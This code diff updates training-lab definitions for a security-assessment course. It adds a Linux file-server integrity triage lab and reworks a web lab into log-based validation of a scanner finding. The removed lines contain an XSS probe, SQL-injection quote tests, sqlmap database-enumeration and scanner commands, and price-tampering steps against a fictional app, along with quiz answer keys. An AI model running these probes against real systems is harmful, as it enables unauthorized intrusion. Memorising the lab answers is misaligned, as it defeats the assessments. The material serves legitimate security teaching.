@@ -2,8 +2,9 @@
 //  Security Assessments Track — Labs (Agent 05)
 // ============================================================
 //  sa-2  File System Security
-//  sa-3  Web Application Security  (BurpProxyLabShell)
-//  sa-4  System Log Assessment
+//  sa-9  File Server Integrity Triage  (L3a share review + L3b host integrity, NightShiftShell)
+//  sa-3  Web Application Security Assessment (Traffic Inspector; validate-a-finding flow)
+//  sa-4  Linux Log Triage: The Audit Gap  (NightShiftShell)
 //  sa-5  User Account Security  (IamMatrixLabShell)
 //
 //  Shells defined in src/shells/security-assessments-shells.jsx.
@@ -365,75 +366,210 @@
   };
 
   // ────────────────────────────────────────────────────────────
-  //  sa-3  Web Application Security  (BurpProxyLabShell)
+  //  sa-9  File Server Integrity Triage: L3a share review + L3b host integrity triage (Operation Night Shift)
   // ────────────────────────────────────────────────────────────
-  function buildSa3Burp() {
-    // ~80 captured requests against https://app.example.local/
+  // The host is built at launch from the Operation Night Shift fixtures (seed A or B,
+  // fixed per learner). Expected values are recomputed from that host's own files by
+  // src/systems/host-integrity.js, so nothing in this definition is an answer key.
+  function nightShiftStep(id, phase, objective, kind, engineCheck, fields) {
+    return Object.assign({
+      id, phase, objective, kind,
+      validation: { type: 'nightShiftHost', check: engineCheck },
+    }, fields);
+  }
+
+  const SA9_LAB = {
+    id: 'sa-9',
+    track: 'security-assessments',
+    title: 'File Server Integrity Triage',
+    difficulty: 'Intermediate',
+    estimatedTime: '50 min',
+    icon: '🗂',
+    tags: ['Permissions', 'ACLs', 'File Integrity', 'Persistence', 'Evidence'],
+
+    source: {
+      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
+      file: 'project-2-File System Security Assessment.md',
+      sha256: '261c60ac55c3739e3721cab757410fad4d646956c80ae145f5eee6e9329c54c9',
+      snapshot: 'src/data/sources/sa-2.source.md',
+    },
+
+    environment: {
+      type: 'linux',
+      shell: 'NightShiftShell',
+      engine: 'MISSION_NEXT_HOST_INTEGRITY',
+      fixtureAware: true,
+      initialCwd: '/home/analyst',
+      fs: context => window.MISSION_NEXT_HOST_INTEGRITY.buildFs(context),
+    },
+
+    scenario: {
+      role: 'SOC analyst on the host-integrity rotation',
+      incident: 'A Linux file server is in scope for a scheduled least-privilege review, and integrity tooling has flagged it. Your ticket is in /home/analyst/ir-ticket.txt. Part A authorizes a permission fix on the finance share. Part B is request-only: preserve evidence, investigate persistence, and recommend the response. AIDE and chkrootkit are already installed and the baseline is from the golden-image build; there is nothing to set up.',
+    },
+
+    exercises: [
+      {
+        id: 'ex0',
+        upstreamHeading: 'L3a — Least-Privilege Share Review',
+        steps: [
+          nightShiftStep('sa-9.ex0.s1', 'preparation', 'soc-02-lesson-06', 'command', 'shareListed', {
+            upstream: { exercise: 'Scenario task', stepNumber: 1, sourceLine: 'ls -l /srv/share/finance' },
+            instruction: 'Read your ticket (ir-ticket.txt) for scope, then inspect the finance share at /srv/share/finance. Show the mode bits on the directory and its files.',
+            hint: 'Try `ls -l /srv/share/finance`, `ls -ld /srv/share/finance`, or `stat /srv/share/finance`.',
+            points: 5,
+          }),
+          nightShiftStep('sa-9.ex0.s2', 'detection', 'soc-02-lesson-04', 'analyze', 'shareOther', {
+            upstream: { exercise: 'Scenario task', stepNumber: 2, sourceLine: 'getfacl /srv/share/finance' },
+            instruction: 'Run getfacl on /srv/share/finance. What permissions does "other" (every local account) have? Submit the other:: line exactly as getfacl shows it.',
+            hint: '`getfacl /srv/share/finance` — the last entry starts with `other::`.',
+            answerLabel: 'other:: entry',
+            points: 10,
+            checkOnLearning: 'sa9-q0',
+          }),
+          nightShiftStep('sa-9.ex0.s3', 'containment', 'soc-02-lesson-06', 'command', 'sharePermsFixed', {
+            upstream: { exercise: 'Scenario task', stepNumber: 3, sourceLine: 'chmod -R o-rwx /srv/share/finance' },
+            instruction: 'Part A authorizes this change. Remove all access for "other" on the share and everything inside it. The owner and the finance group must keep the access they need.',
+            hint: 'Any correct route works: `sudo chmod -R o-rwx /srv/share/finance`, a numeric mode such as 770, or `sudo setfacl -R -m o::--- /srv/share/finance`. Do not remove the finance group\'s access.',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex0.s4', 'detection', 'soc-02-lesson-04', 'analyze', 'shareVerified', {
+            upstream: { exercise: 'Scenario task', stepNumber: 4, sourceLine: 'getfacl /srv/share/finance' },
+            instruction: 'Verify the fix: run getfacl on the share again and submit the other:: entry it reports now.',
+            hint: 'If getfacl still shows access for other, the change did not apply to the whole tree.',
+            answerLabel: 'other:: entry',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex0.s5', 'detection', 'soc-02-lesson-02', 'analyze', 'exposedAccount', {
+            upstream: { exercise: 'Scenario task', stepNumber: 5, sourceLine: 'cat /etc/passwd /etc/group' },
+            instruction: 'Before the fix, "other" meant every local account. Compare /etc/passwd with /etc/group. Which interactive account is not in the finance group, is not an administrator (sudo group), and is not your own analyst account, yet could read and change the payroll files? Submit its username.',
+            hint: 'Read /etc/passwd for interactive shells and /etc/group for the finance and sudo members.',
+            answerLabel: 'Exposed account',
+            points: 10,
+          }),
+        ],
+      },
+      {
+        id: 'ex1',
+        upstreamHeading: 'L3b part 1 — Baseline check and evidence preservation',
+        steps: [
+          nightShiftStep('sa-9.ex1.s4', 'preparation', 'soc-10-lesson-01', 'command', 'evidenceDir', {
+            upstream: { exercise: 'Integrity', stepNumber: 1, sourceLine: 'mkdir -p /evidence/IR-001' },
+            instruction: 'Create an evidence directory named /evidence/IR-<id>/ for this incident. Copies and the chain-of-custody log go here.',
+            hint: '`mkdir -p /evidence/IR-<id>` using the ticket id.',
+            points: 5,
+          }),
+          nightShiftStep('sa-9.ex1.s5', 'detection', 'soc-10-lesson-02', 'command', 'aideReport', {
+            upstream: { exercise: 'Integrity', stepNumber: 2, sourceLine: 'aide --check' },
+            instruction: 'Run the AIDE integrity check against the golden-image baseline. The database is already built.',
+            hint: '`sudo aide --check`, `aide -C`, or `aide --config /etc/aide/aide.conf --check`.',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex1.s6', 'detection', 'soc-05-lesson-07', 'analyze', 'privilegePath', {
+            upstream: { exercise: 'Integrity', stepNumber: 3, sourceLine: 'aide --check' },
+            instruction: 'AIDE flagged more than one path. Read the flagged files. Submit the path of the one that grants privilege escalation.',
+            hint: 'Look at the contents of each flagged file, not only its name.',
+            answerLabel: 'Flagged path',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex1.s7', 'containment', 'soc-10-lesson-01', 'command', 'evidencePreserved', {
+            upstream: { exercise: 'Integrity', stepNumber: 4, sourceLine: 'cp -p, sha256sum, custody.csv' },
+            instruction: 'Preserve every flagged file before anything else. Copy each into your evidence directory so content, mode and owner are kept, hash it, and append one row per item to custody.csv in the same directory with these fields: item, sha256, time, handler, reason. The hash must match the state AIDE reported.',
+            hint: '`cp -p FILE /evidence/IR-<id>/`, `sha256sum FILE`, then `echo "FILE,HASH,TIME,analyst,REASON" >> /evidence/IR-<id>/custody.csv`. Run one command at a time.',
+            points: 15,
+          }),
+        ],
+      },
+      {
+        id: 'ex2',
+        upstreamHeading: 'L3b part 2 — Network and persistence triage',
+        steps: [
+          nightShiftStep('sa-9.ex2.s1', 'detection', 'soc-05-lesson-07', 'command', 'listener', {
+            upstream: { exercise: 'Persistence', stepNumber: 1, sourceLine: 'ss -tlnp' },
+            instruction: 'List the listening TCP sockets with their owning processes. Find the listener that does not belong on a file server.',
+            hint: '`ss -tlnp` or `netstat -tlnp`.',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex2.s2', 'detection', 'soc-05-lesson-02', 'command', 'persistence', {
+            upstream: { exercise: 'Persistence', stepNumber: 2, sourceLine: 'ps -ef --forest' },
+            instruction: 'Show how that process is started and what launched it. Any process-tree or service-definition view works.',
+            hint: '`ps -ef --forest`, `pstree`, or read the unit that starts the process with `systemctl cat` or `systemctl status`.',
+            points: 10,
+          }),
+          nightShiftStep('sa-9.ex2.s3', 'detection', 'soc-05-lesson-07', 'analyze', 'listenerPort', {
+            upstream: { exercise: 'Persistence', stepNumber: 3, sourceLine: 'ss -tlnp' },
+            instruction: 'Submit the TCP port that the unexpected process is listening on.',
+            hint: 'It is in the Local Address column of the listener you found.',
+            answerLabel: 'Listener port',
+            points: 10,
+            checkOnLearning: 'sa9-q1',
+          }),
+        ],
+      },
+      {
+        id: 'ex3',
+        upstreamHeading: 'L3b part 3 — Eradication decision and rebuild request',
+        steps: [
+          nightShiftStep('sa-9.ex3.s4', 'eradication', 'soc-09-lesson-01', 'analyze', 'hostNote', {
+            upstream: { exercise: 'Report', stepNumber: 1, sourceLine: 'Document findings' },
+            instruction: 'Write the case note for the IR lead. Name every flagged path, the account behind the unauthorized sudoers rule, the persistence process with its executable and listening port, and the evidence you preserved. Under this request-only ticket, recommend the response instead of performing it: list each persistence artifact for the rebuild checklist.',
+            hint: 'Root-level compromise means the host cannot be trusted. Say what you recommend, why, and that you are asking rather than acting.',
+            answerLabel: 'Case note',
+            answerMultiline: true,
+            points: 15,
+          }),
+        ],
+      },
+    ],
+
+    checkOnLearning: [
+      {
+        id: 'sa9-q0',
+        bloom: 'comprehension',
+        question: 'The other:: entry on the finance share grants read, write and execute. What does that mean on a multi-user file server?',
+        type: 'single-select',
+        options: [
+          { id: 'a', text: 'Only root and the finance group can read the files', correct: false },
+          { id: 'b', text: 'Any local account can read, modify, or delete the payroll files', correct: true },
+          { id: 'c', text: 'Only users logged in over SMB can reach the files', correct: false },
+          { id: 'd', text: 'Nothing — the ACL overrides the mode bits', correct: false },
+        ],
+        triggerOn: { stepId: 'sa-9.ex0.s2' },
+        reinforces: 'sa-9.ex0.s2',
+      },
+      {
+        id: 'sa9-q1',
+        bloom: 'analysis',
+        question: 'A root-level compromised account has installed service-based persistence and changed the sudoers policy. Under a request-only ticket, what is the right recommendation?',
+        type: 'single-select',
+        options: [
+          { id: 'a', text: 'Eradicate on-host: delete the service file and sudoers rule', correct: false },
+          { id: 'b', text: 'Rebuild from an approved image: root-level compromise makes on-host remediation untrustworthy', correct: true },
+          { id: 'c', text: 'Isolate and do forensics first, never rebuild', correct: false },
+          { id: 'd', text: 'Just disable sudo to prevent further escalation', correct: false },
+        ],
+        triggerOn: { stepId: 'sa-9.ex2.s3' },
+        reinforces: 'sa-9.ex2.s3',
+      },
+    ],
+
+    completion: { requireAllSteps: true, minQuizScore: 0.5 },
+  };
+
+  // ────────────────────────────────────────────────────────────
+  //  sa-3  Validate a Web Finding (Traffic Inspector)
+  // ────────────────────────────────────────────────────────────
+  function buildSa3Capture() {
     const rows = [];
-    let id = 1;
-    function add(method, url, status, length, opts) {
-      const o = opts || {};
-      rows.push({
-        id: 'r' + id++,
-        method: method,
-        url: url,
-        hasParams: !!o.params,
-        edited: false,
-        status: status,
-        length: length,
-        mime: o.mime || 'HTML',
-        title: o.title || '',
-        tls: true,
-        ip: '10.10.24.15',
-        request: o.request || `${method} ${url} HTTP/1.1\nHost: app.example.local\nUser-Agent: Mozilla/5.0\nCookie: PHPSESSID=8f3a1c\nAccept: */*\n\n`,
-        response: o.response || `HTTP/1.1 ${status} OK\nContent-Type: text/html; charset=utf-8\nContent-Length: ${length}\n\n<html>...${status === 200 ? 'OK' : 'response'}...</html>\n`,
-      });
+    function add(id, ip, url, status, title, request, response) {
+      rows.push({ id, method: 'GET', url, hasParams: true, edited: false, status,
+        length: response.length, mime: 'HTML', title, tls: true, ip,
+        request: `GET ${url} HTTP/1.1\nHost: app.example.local\nUser-Agent: Authorized assessment evidence\n\n`,
+        response: `HTTP/1.1 ${status} ${status === 500 ? 'Internal Server Error' : 'OK'}\nContent-Type: text/html\n\n${response}\n` });
     }
-
-    // Browse: home, login, dashboard, products
-    add('GET', '/',                      200, 4128, { title: 'app.example — home' });
-    add('GET', '/static/css/main.css',   200, 1284, { mime: 'CSS' });
-    add('GET', '/static/js/app.js',      304, 0,    { mime: 'JS' });
-    add('GET', '/login',                 200, 3214, { title: 'Login' });
-    add('POST', '/login',                302, 0,    { params: true, title: 'redirect /dashboard',
-      request: 'POST /login HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=j.sanders&password=Spring2026!\n',
-      response: 'HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: PHPSESSID=8f3a1c; Path=/\n\n' });
-    add('GET', '/dashboard',             200, 5921, { title: 'Dashboard' });
-    add('GET', '/api/users/me',          200, 612,  { mime: 'JSON',
-      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":1001,"username":"j.sanders","role":"customer"}\n' });
-    add('GET', '/products',              200, 8244, { title: 'Catalog' });
-    for (let i = 1; i <= 12; i++) {
-      add('GET', `/products/${i}`, 200, 4100 + i*7, { title: `Product ${i}` });
-    }
-    add('GET', '/cart',                  200, 2918, { title: 'Cart' });
-    add('POST', '/cart/add',             200, 412,  { params: true, mime: 'JSON',
-      request: 'POST /cart/add HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=8f3a1c\n\nproduct_id=4&quantity=1&price=199.00\n',
-      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":199.00,"items":1}\n',
-      responseManipulated: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":1.00,"items":1}\n' });
-    add('GET', '/cart',                  200, 3104, { title: 'Cart (1 item)' });
-    add('POST', '/checkout',             302, 0,    { params: true, title: 'redirect /thanks',
-      response: 'HTTP/1.1 302 Found\nLocation: /thanks\n\n' });
-
-    // Reflected XSS: /search?q=
-    add('GET', '/search?q=phone',                 200, 4118, { params: true, title: 'Search results' });
-    add('GET', '/search?q=<script>alert(1)<\/script>', 200, 4218, { params: true, title: 'Search results',
-      response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h2>Results for: <script>alert(1)</script></h2>...\n' });
-
-    // Admin probes (404)
-    add('GET', '/admin',     404, 287, { title: 'Not Found' });
-    add('GET', '/admin/',    404, 289, { title: 'Not Found' });
-    add('GET', '/.git/HEAD', 404, 285, { title: 'Not Found' });
-    add('GET', '/.env',      404, 281, { title: 'Not Found' });
-
-    // SQLi indicator
-    add('GET', "/products?id=1'", 500, 612, { params: true, title: 'Internal Server Error',
-      response: 'HTTP/1.1 500 Internal Server Error\nContent-Type: text/html\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'\' at line 1\n' });
-
-    // Misc noise to round out ~80
-    for (let i = 0; i < 50; i++) {
-      add('GET', `/api/products?cat=${i}`, 200, 1024 + i, { params: true, mime: 'JSON' });
-    }
-
+    add('scan-1', '10.10.24.90', "/products?id=1%27", 500, 'SQL syntax error', '', 'Database syntax error');
+    add('external-1', '198.51.100.44', "/products?id=1%27", 500, 'SQL syntax error', '', 'Database syntax error');
+    add('scan-2', '10.10.24.90', '/products?id=2', 200, 'Product detail', '', 'Product page response');
     return JSON.stringify(rows);
   }
 
@@ -442,15 +578,13 @@
       'home': { 'student': { '.bashrc': '' } },
       'var': {
         'lib': {
-          'burp': {
-            'http-history.json': buildSa3Burp(),
-            'project-config.json': '{"proxy":{"port":8080,"host":"127.0.0.1"}}\n',
-          },
-          'sa': {
-            'sqlmap-results.txt': 'GET parameter \'id\' is injectable.\n',
+          'traffic-inspector': {
+            'http-history.json': buildSa3Capture(),
+            'scanner-report.txt': 'Authorized AppSec scan — app.example.local\nFinding: SQL error disclosed after a single-quote test in GET /products?id=1%27\nSeverity: High (scanner estimate)\nScanner source: 10.10.24.90\nValidation: correlate with access logs; report alone does not establish exploitation or data access.\n',
+            'asset-inventory.txt': 'asset,role,exposure,owner\napp.example.local,customer-facing commerce application,internet-facing,web-platform\n',
           },
         },
-        'log': {},
+        'log': { 'app': { 'access.log': '2026-04-23T09:14:02Z 10.10.24.90 GET /products?id=1%27 500 sql_error\n2026-04-23T09:18:44Z 198.51.100.44 GET /products?id=1%27 500 sql_error\n2026-04-23T09:20:10Z 10.10.24.90 GET /products?id=2 200 ok\n' } },
       },
       'tmp': {},
     };
@@ -463,331 +597,84 @@
     difficulty: 'Intermediate',
     estimatedTime: '60 min',
     icon: '🕸',
-    tags: ['Burp Suite', 'OWASP ZAP', 'Web', 'IDOR', 'XSS', 'SQLi'],
+    tags: ['Web Logs', 'Finding Validation', 'Exposure', 'Prioritization'],
 
     source: {
       repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
       file: 'project-3-Web Application Security Assessment.md',
-      sha256: '4e087898c76325c95d7e96122ace7d3d83b9262e97c96e54b0b58aa8eb1fa895',
+      sha256: '155e696c01f6e41da36a5303416b49eecd881da72d7d60abe48af503d4dcedf8',
       snapshot: 'src/data/sources/sa-3.source.md',
     },
 
-    environment: { type: 'web', shell: 'BurpProxyLabShell', fs: buildSa3Fs },
+    environment: { type: 'web', shell: 'TrafficInspectorShell', fs: buildSa3Fs },
 
     scenario: {
-      role: 'AppSec analyst on the e-commerce rotation',
-      incident: 'Customer reports show inconsistent prices appearing in completed orders for app.example.local. You have a captured proxy session from the testing environment. Use it to identify the class of vulnerability that allows price manipulation, and verify two other web findings flagged by automated tooling.',
+      role: 'SOC analyst reviewing an authorized AppSec handoff',
+      incident: 'The authorized AppSec team supplied a scanner report for app.example.local. Validate the SQL error finding against web access logs, determine whether activity came only from the approved scanner, check the asset role and exposure, then document a priority rationale. All test traffic in this lab was generated within the approved assessment scope.',
     },
 
-    exercises: [
-      {
-        id: 'ex1',
-        upstreamHeading: 'Exercise 1: Intercepting Traffic with OWASP ZAP',
-        steps: [
-          {
-            id: 'sa-3.ex1.s1',
-            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install zaproxy' },
-            kind: 'observe',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: '(Aside) ZAP is the open-source equivalent of Burp. The upstream begins with installing zaproxy. Confirm you have a terminal by pressing Enter on a blank line.',
-            acceptedInputs: [{ type: 'regex', value: /^\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex1.s2',
-            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Configure browser to use ZAP proxy 127.0.0.1:8080' },
-            kind: 'ui',
-            instruction: 'In Burp (left), open the Proxy listener: click "Open browser" in the Proxy toolbar to point a sandboxed browser at 127.0.0.1:8080.',
-            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex1.s3',
-            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'Navigate the web app and observe intercepted requests' },
-            kind: 'ui',
-            instruction: 'In the HTTP history, click the row that shows POST /cart/add to inspect the captured request and response panes.',
-            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'history'] },
-            points: 10,
-            checkOnLearning: 'sa3-q1',
-          },
-        ],
-      },
-      {
-        id: 'ex2',
-        upstreamHeading: 'Exercise 2: Vulnerability Scanning with Burp Suite',
-        steps: [
-          {
-            id: 'sa-3.ex2.s1',
-            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install burpsuite' },
-            kind: 'ui',
-            instruction: 'Burp is already running. The title bar reads "Burp Suite Professional v2024.4". Confirm by clicking the Proxy tab.',
-            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex2.s2',
-            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'Configure browser to use Burp proxy 127.0.0.1:8080' },
-            kind: 'ui',
-            instruction: 'Toggle "Intercept is off" → "Intercept is ON" so the next request can be modified before it leaves the browser.',
-            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'intercept'] },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex2.s3',
-            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'Right-click → Send to Repeater; modify and re-send' },
-            kind: 'ui',
-            instruction: 'Right-click the POST /cart/add row in HTTP history → "Send to Repeater". In Repeater, change `price=199.00` to `price=1` and click Send. Confirm the manipulated response shows cartTotal=1.00.',
-            validation: { type: 'uiPath', expected: ['burp', 'send-to-repeater'] },
-            points: 25,
-            checkOnLearning: 'sa3-q2',
-          },
-        ],
-      },
-      {
-        id: 'ex3',
-        upstreamHeading: 'Exercise 3: Web Server Assessment with Nikto',
-        steps: [
-          {
-            id: 'sa-3.ex3.s1',
-            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install nikto' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Switch to a terminal and install Nikto.',
-            hint: '`sudo apt-get install nikto`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?nikto\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex3.s2',
-            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'nikto -h http://192.168.1.10' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Scan https://app.example.local with Nikto.',
-            hint: '`nikto -h https://app.example.local`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nikto\s+-h\s+https?:\/\/app\.example\.local\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 10,
-            checkOnLearning: 'sa3-q5',
-          },
-        ],
-      },
-      {
-        id: 'ex4',
-        upstreamHeading: 'Exercise 4: SQL Injection Testing with SQLMap',
-        steps: [
-          {
-            id: 'sa-3.ex4.s1',
-            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo apt-get install sqlmap' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Install SQLMap.',
-            hint: '`sudo apt-get install sqlmap`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?sqlmap\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex4.s2',
-            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'Identify a vulnerable parameter (e.g., /index.php?id=1)' },
-            kind: 'analyze',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'In your captured proxy traffic, which endpoint produced a 500 error after appending a single quote (the classic SQLi indicator)? Submit the path with parameter, e.g. /foo?bar=1.',
-            hint: 'Look for the row in your Burp HTTP history with status 500 and a "syntax error" body. The URL ended with `\'`.',
-            validation: { type: 'valueExtracted', expected: ["/products?id=1'", '/products?id=1', '/products', '/products?id'] },
-            points: 15,
-            checkOnLearning: 'sa3-q3',
-          },
-          {
-            id: 'sa-3.ex4.s3',
-            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'sqlmap -u "http://.../index.php?id=1" --batch --dbs' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Run sqlmap against the suspicious parameter.',
-            hint: '`sqlmap -u "https://app.example.local/products?id=1" --batch --dbs`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?sqlmap\s+-u\s+["']?https?:\/\/app\.example\.local\/products\?id=1["']?(\s+--batch)?(\s+--dbs)?\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 15,
-          },
-        ],
-      },
-      {
-        id: 'ex5',
-        upstreamHeading: 'Exercise 5: Web Application Fuzzing with Wapiti',
-        steps: [
-          {
-            id: 'sa-3.ex5.s1',
-            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install wapiti' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Install Wapiti.',
-            hint: '`sudo apt-get install wapiti`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?wapiti\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 5,
-          },
-          {
-            id: 'sa-3.ex5.s2',
-            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'wapiti http://192.168.1.10 -f txt -o wapiti_report.txt' },
-            kind: 'command',
-            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
-            instruction: 'Fuzz https://app.example.local and write a text report.',
-            hint: '`wapiti https://app.example.local -f txt -o wapiti_report.txt`',
-            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wapiti\s+https?:\/\/app\.example\.local(\s+-f\s+\w+)?(\s+-o\s+\S+)?\s*$/ }],
-            validation: { type: 'commandExecuted' },
-            points: 10,
-            checkOnLearning: 'sa3-q4',
-          },
-        ],
-      },
-    ],
+    exercises: [{
+      id: 'ex1', upstreamHeading: 'L7 — Validate the AppSec Finding',
+      steps: [
+        { id: 'sa-3.ex1.s1', upstream: { exercise: 'L7', stepNumber: 1, sourceLine: 'Review the authorized scanner report and correlate the finding with access logs.' }, phase: 'detection', objective: 'soc-08-lesson-01', kind: 'command',
+          environment: { shell: 'LinuxTerminalShell', shellProps: { initialCwd: '/var/log/app' } },
+          instruction: 'The authorized scanner report is at /var/lib/traffic-inspector/scanner-report.txt. Review it, then search the supplied access log for the single-quote request that returned HTTP 500. Use grep; do not run a scan.',
+          hint: '`cat /var/lib/traffic-inspector/scanner-report.txt` and `grep "id=1%27" /var/log/app/access.log`',
+          acceptedInputs: [{ type: 'regex', value: /^grep\s+.*(id=1%27|id=1').*access\.log\s*$/i }],
+          validation: { type: 'commandExecuted' }, points: 15 },
+        { id: 'sa-3.ex1.s2', upstream: { exercise: 'L7', stepNumber: 2, sourceLine: 'Determine whether anyone other than the approved scanner made the matching request.' }, phase: 'analysis', objective: 'soc-08-lesson-03', kind: 'analyze',
+          environment: { shell: 'LinuxTerminalShell', shellProps: { initialCwd: '/var/log/app' } },
+          instruction: 'The access log shows the same SQL error pattern from more than one source. Submit the source address that is not the authorized scanner (10.10.24.90).',
+          answerLabel: 'Non-scanner source IP', hint: 'Compare matching log entries with the scanner source listed in the report.',
+          validation: { type: 'valueExtracted', expected: '198.51.100.44' }, points: 20 },
+        { id: 'sa-3.ex1.s3', upstream: { exercise: 'L7', stepNumber: 3, sourceLine: 'Check the asset role and exposure.' }, phase: 'analysis', objective: 'soc-08-lesson-04', kind: 'analyze',
+          instruction: 'Check the asset inventory in the Traffic Inspector. What is the application asset role?',
+          answerLabel: 'Asset role', hint: 'The inventory identifies the service function and internet exposure.',
+          validation: { type: 'valueExtracted', expected: /customer-facing commerce application/i }, points: 15 },
+        { id: 'sa-3.ex1.s4', upstream: { exercise: 'L7', stepNumber: 4, sourceLine: 'Write a priority rationale and safe owner handoff.' }, phase: 'analysis', objective: 'soc-08-lesson-04', kind: 'analyze',
+          instruction: 'Write a concise priority rationale that cites the confirmed SQL error, the non-scanner source, and the customer-facing internet exposure. Recommend validation and an owner handoff; do not claim data access from these records alone.',
+          answerLabel: 'Priority rationale', hint: 'Include evidence, impact context, uncertainty, and the next safe action.',
+          validation: { type: 'valueExtracted', expected: /sql|500/i }, points: 25 },
+      ],
+    }],
 
     checkOnLearning: [
-      {
-        id: 'sa3-q1',
-        bloom: 'recall',
-        question: 'In the captured POST /cart/add request, which body parameter directly controls the per-item price the server records?',
-        type: 'short-answer',
-        acceptedAnswer: ['price', 'price='],
-        triggerOn: { stepId: 'sa-3.ex1.s3' },
-        reinforces: 'sa-3.ex1.s3',
-      },
-      {
-        id: 'sa3-q2',
-        bloom: 'application',
-        question: 'You sent the request with price=1 in Repeater and the server returned cartTotal=1.00. What class of OWASP finding is this?',
-        type: 'single-select',
-        options: [
-          { id: 'a', text: 'Cross-Site Scripting (XSS)', correct: false },
-          { id: 'b', text: 'SQL Injection', correct: false },
-          { id: 'c', text: 'Insecure Direct Object Reference / Broken Access Control (parameter tampering on price)', correct: true },
-          { id: 'd', text: 'CSRF', correct: false },
-        ],
-        triggerOn: { stepId: 'sa-3.ex2.s3' },
-        reinforces: 'sa-3.ex2.s3',
-      },
-      {
-        id: 'sa3-q3',
-        bloom: 'comprehension',
-        question: 'A request to /products?id=1\' returned an error message disclosing MySQL syntax. What does that primarily indicate?',
-        type: 'multi-select',
-        options: [
-          { id: 'a', text: 'The id parameter is concatenated unsafely into a SQL query', correct: true },
-          { id: 'b', text: 'Stack traces are leaking back-end DBMS information', correct: true },
-          { id: 'c', text: 'The endpoint is using parameterized queries correctly', correct: false },
-          { id: 'd', text: 'sqlmap can likely exploit this further', correct: true },
-        ],
-        passThreshold: 'all-correct',
-        triggerOn: { stepId: 'sa-3.ex4.s2' },
-        reinforces: 'sa-3.ex4.s2',
-      },
-      {
-        id: 'sa3-q4',
-        bloom: 'analysis',
-        question: 'You have evidence of price-tampering IDOR, an open SQLi indicator on /products, and a reflected XSS on /search. Pick every reasonable next-day action.',
-        type: 'multi-select',
-        options: [
-          { id: 'a', text: 'File the IDOR as critical and ask app owners to enforce server-side price validation against the catalog', correct: true },
-          { id: 'b', text: 'Disable the public site without notifying stakeholders', correct: false },
-          { id: 'c', text: 'Confirm the SQLi locally then file with safe PoC, do not exfiltrate', correct: true },
-          { id: 'd', text: 'Capture the XSS payload context (URL + sink) for the dev team', correct: true },
-        ],
-        passThreshold: 'all-correct',
-        triggerOn: { stepId: 'sa-3.ex5.s2' },
-        reinforces: 'sa-3.ex5.s2',
-      },
-      {
-        id: 'sa3-q5',
-        bloom: 'comprehension',
-        question: 'Nikto reported `/admin/` returning HTTP 200 and `PHPSESSID` without the HttpOnly flag. Why do those matter?',
-        type: 'multi-select',
-        options: [
